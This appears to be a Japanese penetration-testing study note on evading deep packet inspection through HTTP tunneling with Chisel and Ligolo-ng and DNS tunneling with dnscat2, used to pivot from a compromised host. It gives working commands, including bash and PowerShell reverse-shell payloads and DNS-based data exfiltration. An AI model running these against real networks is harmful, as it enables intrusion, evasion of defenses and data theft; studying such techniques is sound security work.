- 関連ノート：
	- [Port Redirection & SSH Port Forwarding](Port%20Redirection%20&%20SSH%20Port%20Forwarding.md)
	- [53 - DNS](../Ports%20-%20Service/53%20-%20DNS.md)

---

# Deep Packet Inspection(DPI)とは

- ルールベースでトラフィックを監視するための技術で、侵害を示すパターンを指定しておく
- これにより、外向けのSSHトラフィックを遮断され、[Port Redirection & SSH Port Forwarding](Port%20Redirection%20&%20SSH%20Port%20Forwarding.md)が失敗することがある
- **Deep Packet Inspectionを回避するために**...
	- HTTP通信が許可されているとき：[HTTP Tunneling](HTTP・DNSトンネリング（Chisel,%20Ligolo-ng,%20Dnscat2）.md#HTTP%20Tunneling)
	- DNS通信が許可されているとき：[DNS Tunneling](HTTP・DNSトンネリング（Chisel,%20Ligolo-ng,%20Dnscat2）.md#DNS%20Tunneling)

---
---

# HTTP Tunneling

## HTTP Tunnelingの原理

- 初期侵入できた足場のマシンでHTTPのインバウンド通信のみが許可されている状況では、SSH通信によるポートフォワーディングも、リバースシェルの確立もできない
- ここで、HTTPでトンネリングすることで、ローカルNW上にアクセスすることが可能になる
	- SSH通信をHTTPでカプセル化するなども可能

---

## HTTP Tunneling w/ Chisel

### Chiselについて

- クライアント・サーバーモデルを採用しているため、送受信双方にツールをダウンロードする必要がある
- OS依存はないが、ChiselのバージョンとOSのアーキテクチャで不一致が起きた場合は実行失敗する
- ChiselサーバーはSOCKSポート経由で送信される<u>すべてのデータをHTTP通信としてカプセル化</u>するので、HTTPトンネルの中にSSHパケットを通すことが可能
- Chiselクライアントはデ・カプセル化し、宛先に転送する

### ChiselによるHTTP Tunneling(リモートポートフォワーディング)

1. 足場(chisel client)がWindowsの場合は🔗[Chisel release page - Github](https://github.com/jpillora/chisel/releases)のAssetsからアーキテクチャに応じたバイナリ（`.gz`ファイル）をダウンロードし、Linuxの場合は以下のコマンドでchiselをダウンロード
```zsh
sudo apt install chisel
```

2. Chiselバイナリを足場(chisel client)に転送する

3. chisel server(攻撃者マシン)を起動
```zsh
chisel server --port <bind_port> --reverse
```
- `bind_port`：chisel接続用のポートで、1025以上任意

4. 足場のマシン(chisel client)上で、トンネルを作成する
```zsh
# Dynamic Port Forwardingの場合
chisel client <attacker_IP>:<bind_port> R:socks > /dev/null 2>&1 &
```
```zsh
# 単純なリモートポートフォワーディングの場合
chisel client <attacker_IP>:<bind_port> R:<port|socks>:<target_IP>:<port> &
```
- `R:`：
	- target_IPに127.0.0.1と指定すれば、ターゲットのローカルサービスへアクセスできる
	- ポート番号ではなく`socks`と指定すれば、1080番ポートにSOCKSプロキシを立て、Dynamic Port Forwardingが可能になる
- `> /dev/null 2>&1 &`：エラー含むすべての入出力をリダイレクトする（[スクリプト・コマンド・シェル操作](../Common/スクリプト・コマンド・シェル操作.md#シェル(`sh`系)の特殊記号一覧表)）

5. 成功すればchisel server(攻撃者マシン)に以下のように表示される
```
2025/09/27 12:41:59 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

6. 攻撃者のマシンから目的の操作をする
```sh
# Nmap
sudo proxychains nmap -sT -p- -Pn -n <target_IP>
```
- SOCK経由のSSHアクセスの場合：[22 - SSH](../Ports%20-%20Service/22%20-%20SSH.md#SSHをSOCKSプロキシ経由で動かす)
- socksを使うときは `/etc/proxychains4.conf`に`socks5 127.0.0.1 1080`の設定を入れること
- Proxychains は sudo と一緒に使う

>[!TIP]
>`proxychains nmap`の速度が遅い場合は、Proxychainsの設定で以下の２つの値を小さくする。
```zsh
# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000
```
	↓
```zsh
tcp_read_time_out 1200
tcp_connect_time_out 800
```

---

## Ligolo-ng

### Ligolo-ngとは

🔗[公式ドキュメント](https://docs.ligolo.ng/)
🔗[Ligolo-ng - GitHub](https://github.com/nicocha30/ligolo-ng)

- 用途：chiselと同様
- 動作原理：chiselなどはSOCKSプロキシベースのツールだが、これはTUNインターフェースを使用して**VPNのように動作する**
- ✅メリット：
	- 他ツールと比較し高速かつ安定している
	- proxychainsを使わずにDynamic Port Forwardingが可能なので、**静的リンクのオブジェクトでも実行可能**（＝より多くのツールが使える）
>[!TIP]
>ポートフォワーディング・トンネリング系でもっとも使いやすい。

>[!NOTE]
>Go言語のversionが1.20以上でビルドされており、1.19以下のversionでビルドされたバイナリは存在せず、"'GLIBC_2.32' not found"のエラーが出たときは使えないため、[HTTP Tunneling w/ Chisel](HTTP・DNSトンネリング（Chisel,%20Ligolo-ng,%20Dnscat2）.md#HTTP%20Tunneling%20w/%20Chisel)を使う。

### Ligolo-ngの仕組み

`ligolo-agent`と`ligolo-proxy`があり、Agentを足場のマシンで、Proxyを攻撃者のマシンで起動させる。

1. 接続確立
	侵害されたマシン上で`ligolo-agent`が起動されると、攻撃者のマシンで待機している`ligolo-proxy`に対してTCP/TLS接続を開始する。この「内側から外側へ」の接続方向により、ターゲットネットワークのFWによるインバウンド接続制限を回避しやすくなる。
2. TUNインターフェース作成
	`ligolo-proxy`は、接続を受け付けると攻撃者のマシン上に仮想的なネットワークインターフェース（TUNインターフェース、デフォルト名は`ligolo`）を作成
3. ルーティング
	攻撃者は、アクセスしたい内部ネットワークのセグメント宛てのトラフィックが、この`ligolo`インターフェースを経由するようにルーティングを設定
4. パケットの転送
	`ligolo`インターフェースに送られたネットワークパケットは、`ligolo-proxy`によってカプセル化され、確立されたTLSトンネルを通じて`ligolo-agent`に転送される。`ligolo-agent`は受信したパケットをターゲットネットワークに送り出す。逆方向の通信も同様に処理される。

## Tunneling w/ Ligolo-ng

1. `sudo apt install`か、[Ligolo-ng release - Github](https://github.com/nicocha30/ligolo-ng/releases)からダウンロードする

2. 攻撃者のマシン上でTUNインターフェースを作成する
```zsh
sudo ip tuntap add user <attacker_username> mode tun ligolo
sudo ip link set ligolo up
```
- `ip a show ligolo`とすると、"ligolo: <NO-CARRIER,POINTOPOINT,MULTICAST,NOARP,==UP==> mtu 1500 qdisc fq_codel state **DOWN** group default qlen 500 link/none "と表示される

3. Proxyサーバーの起動
```zsh
# githubからインストールした場合は./proxy...
ligolo-proxy -selfcert -laddr 0.0.0.0:<ListenPort>
```
- Web UIを起動するか(y/n)と聞かれるが、起動しなくてよい

4. [Ligolo-ng relase - GitHub](https://github.com/nicocha30/ligolo-ng/releases)から足場のマシンのアーキテクチャ及びプロセッサに合ったagentバイナリをダウンロードし、足場に転送した上で、足場上でAgentを起動する
```zsh
# windowsであってもコマンドは一緒(バイナリのパスは環境に合わせて)
# githubからインストールした場合は./agent...
./ligolo-agent -connect <attacker_IP>:<listen_port> -ignore-cert
```

5. 攻撃者のマシンで`[INFO] Agent joined`と表示されたことを確認し、セッションに接続して、足場のマシンのローカルNW側 cidrを特定する(`ligolo-ng >`プロンプト)
```zsh
# セッション一覧の表示
session

# セッションに接続
session <Session_ID>

# 足場マシンのローカルNW側インターフェースを特定
ifconfig
```

![](../../Images/Pasted%20image%2020251119071530.png)

$$ローカルNW側インターフェースが表示されている$$

6. 攻撃者のマシンで<u>新たなターミナルを開き</u>、攻撃者のマシンからローカルNWへの通信が、Ligolo-ngが作成したTUNインターフェース（`ligolo`）を経由するようにルーティングを設定
```zsh
# 例：sudo ip route add 172.16.125.0/24 dev ligolo
sudo ip route add <ローカルNW_subnet> dev ligolo
```

7. 攻撃者のマシンのProxyサーバーのインタラクティブシェル（ステップ5で`ifconfig`を実行したもの）に戻り、トンネリングを開始
```zsh
start
```

8. 攻撃者のマシンから目的の操作を実行する
```zsh
# nmapの例
sudo nmap 172.16.125.33
```
- ✅chiselなどと異なり、攻撃者のマシンのインターフェースを指定する必要はなく、ローカルNWのインターフェースを直接指定可能（透過的）
- Ligolo-proxyが`ERRO connection was refused`となった場合：
	- Ligolo-agent側の接続有効期限が切れている可能性があるため、再度ステップ４を実行
	- Nmapなどclosed portにアクセスする場合は、このエラーが表示されるが正常

### 補足：Ligolo-ngのクリーンアップ

再起動でもクリーンアップされる。

1. Ligolo-proxyプロンプトから、トンネルを停止し、Proxyサーバーを修了する
```zsh
stop
exit
```

2. ルーティングテーブルから追加したルートを削除し、TUNインターフェースを削除
```zsh
sudo ip route del <ローカルNW cidr> dev ligolo

sudo ip link set ligolo down
sudo ip tuntap del mode tun ligolo

# 確認
ip a show
```

---

## Listener w/ Ligolo-ng 

- 用途：**ツール転送**やSMB接続、**リバースシェル接続**などの用途で使う
	- 例えばローカルNW内のマシンに対し、攻撃者の用意したHTTPサーバー経由でMimikatzを送りたいときなど

- 通信方向：ローカルNWのAgent以外のマシン → 足場マシン(Agent)のlistener → トンネル → 攻撃者マシン
- 以下、[Tunneling w/ Ligolo-ng](HTTP・DNSトンネリング（Chisel,%20Ligolo-ng,%20Dnscat2）.md#Tunneling%20w/%20Ligolo-ng)のステップ７で`start`としてから実行するものとする

### 具体的なユースケース：リバースシェル

1. 攻撃者マシンのLigolo-ngプロンプトから、Agentに対し、Agent-listenerを立てるように設定
```zsh
listener_add --addr 0.0.0.0:<agent_listen_port(任意)> --to 127.0.0.1:<attacker_listen_port> --tcp

listener_list
```

![](../../Images/Pasted%20image%2020251120124523.png)

$$Agentが1234ポートでリッスンし、通信を攻撃者のマシンの4321ポートにリダイレクト$$

2. 攻撃者のマシン(Proxy)上で新たなターミナルを開き、ncリスナーを立てる
```zsh
sudo rlwrap nc -lvnp <attacker_listen_port>
```

3. ローカルNW側のAgent以外のマシン上から、Agentに対しリバースシェルペイロードを実行
```zsh
# linux
bash -i >& /dev/tcp/<agent_local_IP>/<agent_listen_port> 0>&1

# windows
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<agent_local_IP>',<agent_listen_port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
- `agent_local_IP`には内部NWインターフェースのIPを指定
- 関連ノート：[Bind & Reverse Shell・ペイロード・安定化手法](../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md)

4. 攻撃者のマシンでローカルNW側のマシンのリバースシェルを確立される

### 具体的なユースケース：ファイル転送

ローカルNWから攻撃者のマシンでホストしているHTTPサーバーに直接アクセスできないときに使う。

1. 攻撃者のマシンでWebサーバーをホスト
```zsh
python -m http.server <HTTP_Port>
```

2. 攻撃者のマシンでLigolo-ngプロンプトから、Agentに対し、Agent-listenerを立てるように設定
```zsh
listener_add --addr 0.0.0.0:<agent_listen_port(任意)> --to 127.0.0.1:<HTTP_Port> --tcp
```

3. ローカルNWのAgent以外のマシン上からファイルダウンロード
```powershell
Invoke-WebRequest -Uri http://<agent_local_IP>:<agent_listen_port>/<file> -Outfile <output_path>
```

---

## localhostサービスへのアクセス w/ Ligolo-ng

Agentで`localhost（127.0.0.1）`でしかアクセスできないサービスや、0.0.0.0で接続を受け付けているが、FWにより接続できないサービスにアクセスするときに使う。

1. Ligolo-ng専用のマジックCIDRを使用する
```zsh
sudo ip route add 240.0.0.1/32 dev ligolo
```

2. Agentのローカルサービスにアクセスする
```zsh
# sshの例
ssh <user>@240.0.0.1
```

---
---

# DNS Tunneling

## DNS Tunnelingの原理

- 条件：DNS server（権威サーバー）を支配下に置く

- 原理解説にあたっての前提：
	- ローカルNWからはWAN上にあるマシンに直接アクセスできない（下図Jump Host)
	- DNSリゾルバ（名前解決を請け負う）がローカルNWと通信可能（下図DNS resolver）
	- 権威サーバー(名前解決情報を持つ)がWANにある（下図DNS server）

- 参考記事：🔗[ChamelDoH インプラント ～DNSトンネリング or DNS over HTTPS (DoH) ?～ - NECセキュリティブログ](https://jpn.nec.com/cybersecurity/blog/240920/index.html)

 >[!Warning]
 >DNSは１つのパケットで少量のデータしかやり取りできないので、大きなデータは複数バイトに分割してやり取りしており、データのドロップが発生する可能性がある。

### データが外に出る仕組み

- ローカルNWから権威サーバーが持つ名前解決データを問い合わせると、DNSリゾルバが名前解決のために問い合わせ内容を権威サーバーに転送する
```zsh
nslookup sensitive_data.domain.com
```
- ↓　ローカルNWからWAN上の権威サーバーにデータが流出する
```zsh
...
04:57:40.721682 IP <DNS_resolver_IP>.65122 > <DNS_server_IP>.domain: 26234+ [1au] A? sensitive_data.domain.com. (57)
```

### データが内に入る仕組み

- 権威サーバーがTXTレコードを保有していて、それをローカルNWから問い合わせると、内部に権威サーバーのTXTレコード情報が流入する
```zsh
nslookup -type=txt <domain>
```
	↓
```zsh
...
Non-authoritative answer:
<domain>      text = "<string>"
```

![](../../Images/Pasted%20image%2020260315104051.png)

$$DNSリゾルバを介してデータが漏洩・侵入するイメージ$$

## DNS Tunneling w/ Dnscat2

1. 権威サーバー上（上図ではDNS server)でdnscat2 serverを起動
```zsh
dnscat2-server <domain>
```

2. DNSクライアント(上図ではJump Host)でdnscat2 clientを起動
```zsh
./dnscat <domain>
```
- 接続が確立すると、dnscat2 clientに"Session established!"と出力

3. 権威サーバー上でdnscat2コマンドシェルを使用（`dnscat2>`プロンプト）
```zsh
# アクティブなウィンドウをリストアップ
windows

# 表示されたウィンドウを使用（windowsではないので注意）
window -i 1

# listenコマンド(SSH -Lと同様）でローカルポートフォワーディング
listen 0.0.0.0:<listen_port> <target_IP>:<port>
```

4. 攻撃者のマシンからリッスンポートにアクセスし任意の操作をする
```zsh
# 例：smbclientの場合
smbclient -U <username> --password=<password> -p <listen_port> -L //<DNS_server_IP>/
```
